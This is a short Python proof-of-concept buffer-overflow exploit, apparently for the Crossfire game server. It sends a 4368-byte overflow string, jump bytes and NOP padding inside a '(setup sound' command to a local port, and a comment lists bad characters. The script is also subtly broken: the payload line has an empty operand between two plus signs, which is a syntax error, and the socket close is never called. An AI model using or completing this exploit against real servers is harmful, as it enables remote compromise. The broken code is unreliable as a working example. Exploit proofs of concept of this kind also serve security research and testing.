#!/usr/bin/python3
# POC by x41 - v1.0 - Crossfire
import socket

host = "127.0.0.1"
port = 13327

# Bad: \x00\x09\x0a
crash = b'A' * 4368 +  + b'\x83\xc0\x0c\xff\x0e\x90\x90'

buffer = b'\x11(setup sound ' + crash + b'\x90\x00#'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print("Sending Buffer")
s.connect((host, port))

data = s.recv(1024)
print(data)

s.send(buffer)
s.close

print("Done")
